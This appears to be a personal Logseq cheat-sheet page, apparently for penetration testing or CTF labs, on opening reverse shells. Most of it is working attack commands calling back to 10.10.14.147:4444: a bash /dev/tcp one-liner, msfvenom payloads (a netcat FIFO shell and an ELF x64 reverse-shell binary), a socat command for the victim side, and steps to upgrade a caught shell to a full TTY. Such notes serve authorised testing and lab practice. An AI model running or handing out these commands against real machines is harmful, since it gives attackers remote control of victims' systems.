public:: true
tags:: reverse shell

- ### One-liner reverse shell
  For more reverse shell examples check  [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell).
	- #### Just `bash`
	  logseq.order-list-type:: number
	  ```bash
	  bash -c "bash -i >& /dev/tcp/10.10.14.147/4444 0>&1"
	  ```
	- #### Generate one-liner reverse shells with `msfvenom`
	  logseq.order-list-type:: number
		- List payloads
		  logseq.order-list-type:: number
		  ```bash
		  msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
		  ```
		- Use `netcat` regardless if it's the GNU ore the openBSD (the one with `-e` option) implementation
		  logseq.order-list-type:: number
		  ```bash
		  ┌──(crazybyte㉿kali)-[~]
		  └─$ msfvenom -p cmd/unix/reverse_netcat lhost=10.10.14.147 lport=4444
		  [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
		  [-] No arch selected, selecting arch: cmd from the payload
		  No encoder specified, outputting raw payload
		  Payload size: 90 bytes
		  mkfifo /tmp/zmko; nc 10.10.14.147 4444 0</tmp/zmko | /bin/sh >/tmp/zmko 2>&1; rm /tmp/zmko
		  ```
	- #### Create ELF x64 reverse shell
	  logseq.order-list-type:: number
	  ```bash
	  msfvenom -p linux/x64/shell_reverse_tcp lhost=10.10.14.147 lport=4444 -f elf > rv
	  chmod +x rv
	  ```
	  `nc` needs to be available and reaceable from `$PATH`.
- #### Upgrade from a simple shell to a fully interactive tty
  Additional info can be found [here](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).
	- With `python`
	  
	  ```bash
	  python -c 'import pty; pty.spawn("/bin/bash")'
	  ```
	- With `socat`
	  id:: 65534bc6-4e92-4e47-aa27-491d85b83cdd
		- On Kali (Attacker)
		  
		  ```bash
		  socat file:`tty`,raw,echo=0 tcp-listen:4444
		  ```
		- On the victim machine
		  
		  ```bash
		  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.147:4444
		  ```
	- With `pythom` + `netcat` + some magic
	  *This is the [Phineas Fisher method](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-3-upgrading-from-netcat-with-magic).*
		- Within the reverse shell
		  
		  ```bash
		  python -c 'import pty; pty.spawn("/bin/bash")'
		  Ctrl-Z
		  ```
		- From Kali
		  ```bash
		  # Works for both: bash and zsh
		  stty raw -echo; fg
		  ```
		  *Please note that `bash` and `zsh` handle the `stty` command in a [different way](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell).*
		- Again within the reverse shell
		  
		  ```bash
		  reset
		  export SHELL=bash
		  export TERM=xterm-256color
		  stty rows <num> columns <cols>
		  ```